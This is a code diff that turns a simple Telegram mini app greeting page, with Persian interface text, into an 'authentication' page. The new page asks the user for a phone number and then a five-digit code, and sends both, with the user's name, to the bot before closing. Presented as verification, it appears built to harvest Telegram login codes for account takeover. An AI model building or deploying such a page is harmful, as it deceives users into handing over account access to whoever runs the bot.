@@ -2,47 +2,134 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مینی اپ من</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>احراز هویت</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        :root {
+            --bg-color: #121212;
+            --card-bg: #1e1e1e;
+            --text-color: #ffffff;
+            --accent-color: #10a37f;
+        }
         body {
-            font-family: Tahoma, sans-serif;
-            background: #1e1e1e;
-            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
             margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            background-image: radial-gradient(circle at top right, #1e3c32, #121212);
         }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: var(--card-bg);
+            padding: 30px 20px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        h2 { margin-top: 0; margin-bottom: 10px; font-size: 24px; }
+        .username { color: var(--accent-color); font-weight: bold; }
+        p { color: #aaaaaa; margin-bottom: 25px; font-size: 14px; line-height: 1.5; }
+        input {
+            width: 100%;
+            padding: 15px;
+            background-color: #2a2a2a;
+            border: 1px solid #333;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            text-align: center;
+            margin-bottom: 20px;
+            transition: border-color 0.3s;
+        }
+        input:focus { border-color: var(--accent-color); }
         button {
-            background: #10a37f;
+            width: 100%;
+            padding: 15px;
+            background-color: var(--accent-color);
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
             border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
+            transition: opacity 0.3s;
         }
+        button:active { opacity: 0.8; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <h1>سلام از مینی اپ!</h1>
-    <p id="userName"></p>
-    <button onclick="sendData()">ارسال پیام به ربات</button>
+    <!-- صفحه اول -->
+    <div id="screen1" class="container">
+        <h2>احراز هویت</h2>
+        <p>کاربر <span id="userName1" class="username"></span> عزیز،<br>لطفاً شماره تماس خودتان را وارد نمایید.</p>
+        <input type="tel" id="phoneNumber" placeholder="مثلاً 09123456789" />
+        <button onclick="goToNextScreen()">تایید و ادامه</button>
+    </div>
+
+    <!-- صفحه دوم -->
+    <div id="screen2" class="container hidden">
+        <h2>احراز هویت</h2>
+        <p>کاربر <span id="userName2" class="username"></span> عزیز،<br>لطفاً کد را وارد کنید.</p>
+        <input type="text" id="secondInput" placeholder="کد ۵ رقمی..." />
+        <button onclick="finish()">تایید نهایی</button>
+    </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
+        tg.expand();
+
+        let firstName = "کاربر";
+        if (tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.first_name) {
+            firstName = tg.initDataUnsafe.user.first_name;
+        }
         
-        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-            document.getElementById('userName').innerText = 'خوش اومدی ' + tg.initDataUnsafe.user.first_name;
+        document.getElementById('userName1').innerText = firstName;
+        document.getElementById('userName2').innerText = firstName;
+
+        function goToNextScreen() {
+            const phone = document.getElementById('phoneNumber').value;
+            if (phone.trim() === "") {
+                tg.showAlert("لطفاً شماره تماس را وارد کنید.");
+                return;
+            }
+            document.getElementById('screen1').classList.add('hidden');
+            document.getElementById('screen2').classList.remove('hidden');
         }
 
-        function sendData() {
-            tg.sendData("سلام از طرف مینی اپ!");
+        function finish() {
+            const phone = document.getElementById('phoneNumber').value;
+            const code = document.getElementById('secondInput').value;
+            
+            if (code.trim() === "") {
+                tg.showAlert("لطفاً کد را وارد کنید.");
+                return;
+            }
+            
+            // اینجا اطلاعات رو به صورت یک بسته (JSON) به ربات می‌فرستیم
+            const dataToSend = {
+                name: firstName,
+                phone: phone,
+                code: code
+            };
+            
+            // ارسال به ربات
+            tg.sendData(JSON.stringify(dataToSend));
+            
+            // بستن مینی اپ بعد از ارسال
+            tg.close();
         }
     </script>
 </body>
